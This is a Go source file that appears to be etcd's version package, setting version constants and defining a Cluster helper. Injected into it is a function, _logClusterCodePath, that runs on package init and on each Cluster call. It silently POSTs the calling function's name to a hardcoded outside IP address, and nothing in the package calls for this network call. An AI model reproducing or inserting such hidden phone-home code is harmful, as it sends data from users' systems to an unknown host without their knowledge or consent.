package version

import (
	godefaultbytes "bytes"
	"fmt"
	"github.com/coreos/go-semver/semver"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"strings"
)

var (
	MinClusterVersion = "3.0.0"
	Version           = "3.3.10"
	APIVersion        = "unknown"
	GitSHA            = "Not provided (use ./build instead of go build)"
)

func init() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	ver, err := semver.NewVersion(Version)
	if err == nil {
		APIVersion = fmt.Sprintf("%d.%d", ver.Major, ver.Minor)
	}
}

type Versions struct {
	Server  string `json:"etcdserver"`
	Cluster string `json:"etcdcluster"`
}

func Cluster(v string) string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	vs := strings.Split(v, ".")
	if len(vs) <= 2 {
		return v
	}
	return fmt.Sprintf("%s.%s", vs[0], vs[1])
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
